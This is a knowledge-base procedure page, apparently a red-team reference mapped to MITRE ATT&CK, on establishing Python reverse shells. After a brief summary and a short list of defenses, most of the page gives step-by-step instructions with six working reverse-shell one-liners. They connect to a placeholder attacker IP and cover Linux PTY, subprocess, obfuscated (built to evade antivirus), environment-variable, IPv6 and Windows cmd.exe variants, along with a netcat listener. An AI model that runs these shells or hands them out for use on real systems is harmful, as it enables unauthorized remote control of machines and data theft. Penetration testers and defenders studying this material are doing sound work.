---
id: eccaad25-ac8e-4cce-a752-c46b05a05200
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Scripting|T1064 - Scripting]]'
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques:
  - '[[sub-techniques/Web Protocols|T1071.001 - Web Protocols]]'
  - '[[sub-techniques/Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
  - '[[tags/Python]]'
  - '[[tags/Reverse Shell]]'
commands: []
platforms:
  - Linux
  - Windows
tools: []
validated: true
---

# Establish-Python-Reverse-Shell

## Summary

A Python reverse shell is a type of remote access trojan (RAT) that allows an attacker to gain access to a victim's machine. This is achieved by opening a network connection from the victim's machine to the attacker's machine. The attacker can then execute commands on the victim's machine, essentially giving them full shell access to the system. This technique is often used by attackers to maintain persistence on a compromised system or to exfiltrate data.

## Description

A Python reverse shell is a type of remote access trojan (RAT) that allows an attacker to gain access to a victim's machine. This is achieved by opening a network connection from the victim's machine to the attacker's machine. The attacker can then execute commands on the victim's machine, essentially giving them full control over the system. This technique is often used by attackers to maintain persistence on a compromised system or to exfiltrate data.

The Python reverse shell works by creating a socket connection between the victim and the attacker. The attacker listens on a specified port for incoming connections, and the victim connects to that port. Once the connection is established, the attacker can execute commands on the victim's machine via the shell.

This technique can be valuable for red teaming, penetration testing, or for educational purposes. Various one-liner variations are provided to suit different evasion needs, such as obfuscation to avoid detection, IPv6 support, and Windows compatibility.

## Requirements

1. Network access between the attacker and victim machines (outbound from victim to attacker).
2. Python installed on the victim machine (Python 2 or 3 compatible for most variants).
3. A listener on the attacker's machine to accept incoming connections (e.g., using netcat: `nc -lvnp $_ATTACKER_PORT`).
4. Initial access to the victim machine to execute the Python one-liner (e.g., via RCE, credential access, or file upload).

## Defense

1. Implement network segmentation to limit access to critical systems and block outbound connections to untrusted IPs/ports.
2. Use strong authentication mechanisms to prevent unauthorized access.
3. Monitor network traffic for signs of suspicious activity, such as unexpected outbound TCP connections from internal hosts to external IPs on high ports.
4. Enable endpoint detection and response (EDR) tools to monitor Python process spawning and socket creations.
5. Log and alert on anomalous Python executions, especially one-liners importing socket, os, pty, or subprocess.

## Objectives

1. Gain remote access to a victim's machine.
2. Execute commands on the victim's machine.
3. Maintain persistence on a compromised system.
4. Exfiltrate data from a compromised system.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Before executing any reverse shell on the victim, start a listener on your machine to receive the incoming connection. This step ensures the socket is ready to accept the reverse connection.

Use a tool like netcat to listen on the specified port (replace 4242 with your chosen port).

**Expected Output**: Listener prompt waiting for connection, e.g., "Listening on [0.0.0.0] (family 0, port 4242)".

### Step 2: Execute Basic Reverse Shell with PTY on Victim (Linux/Unix)

**Context**: This basic variant uses direct imports and pty.spawn to provide an interactive pseudo-terminal shell, ideal for standard Linux/Unix targets without evasion needs.

**Code** ([[codes/Python-Basic-Reverse-Shell-PTY]]):

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$_ATTACKER_IP",$_ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Replace $_ATTACKER_IP and $_ATTACKER_PORT with your listener details. Execute this one-liner on the victim machine.

**Expected Output**: On the attacker listener, an incoming connection followed by a shell prompt (e.g., "$ " or "# "), allowing command execution.

**Success Indicators**:
- Connection established on listener.
- Interactive shell responds to commands like `whoami` or `id`.

### Step 3: Execute Reverse Shell with Subprocess Call on Victim (Linux/Unix)

**Context**: This variant uses subprocess.call for shell execution, suitable when pty is unavailable or restricted, providing a non-interactive but functional shell.

**Code** ([[codes/Python-Basic-Reverse-Shell-Subprocess-Call]]):

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$_ATTACKER_IP",$_ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Replace placeholders and execute on victim.

**Expected Output**: Connection on listener with shell output, though potentially less interactive than PTY.

**Success Indicators**:
- Commands executed and output returned.
- No errors in socket connection.

### Step 4: Execute Obfuscated Reverse Shell with __import__ and PTY

**Context**: Use this obfuscated version to evade basic string-based detection tools that scan for keywords like 'socket' or 'pty'. It uses __import__ to load modules dynamically.

**Code** ([[codes/Python-Obfuscated-Reverse-Shell-Import-PTY]]):

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$_ATTACKER_IP",$_ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Execute on victim after replacing parameters.

**Expected Output**: Interactive shell on listener, similar to basic PTY.

**Success Indicators**:
- Shell interactivity confirmed.
- No detection by simple AV/EDR rules.

### Step 5: Execute Environment Variable-Based Reverse Shell

**Context**: This variant uses environment variables for IP and port, useful for scripting or when passing parameters dynamically without hardcoding.

First, set variables on victim: `export RHOST="$_ATTACKER_IP"; export RPORT=$_ATTACKER_PORT`

**Code** ([[codes/Python-Reverse-Shell-Using-Environment-Variables-PTY]]):

```python
export RHOST="$_ATTACKER_IP";export RPORT=$_ATTACKER_PORT;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

**Expected Output**: Shell connection via listener.

**Success Indicators**:
- Variables correctly read and connection succeeds.

### Step 6: Execute IPv6 Reverse Shell (Linux/Unix)

**Context**: For targets behind IPv6-only networks or when IPv4 is firewalled, use this variant with AF_INET6.

**Code** ([[codes/Python-IPv6-Reverse-Shell-PTY]]):

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("$_ATTACKER_IPV6",$_ATTACKER_PORT,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Use IPv6 address for $_ATTACKER_IPV6 (e.g., "dead:beef:2::125c").

**Expected Output**: IPv6 connection and shell.

**Success Indicators**:
- Connection over IPv6 confirmed.

### Step 7: Execute Windows Reverse Shell

**Context**: For Windows targets, this variant spawns cmd.exe using threading to handle bidirectional communication.

**Code** ([[codes/Python-Windows-Reverse-Shell-Threading-CMD]]):

```python
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('$ATTACKER_IP',$ATTACKER_PORT));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```

Execute in PowerShell or CMD on Windows victim, replacing parameters.

**Expected Output**: CMD shell on listener (e.g., "C:\Windows\system32>").

**Success Indicators**:
- Bidirectional command execution works.
- No threading errors.
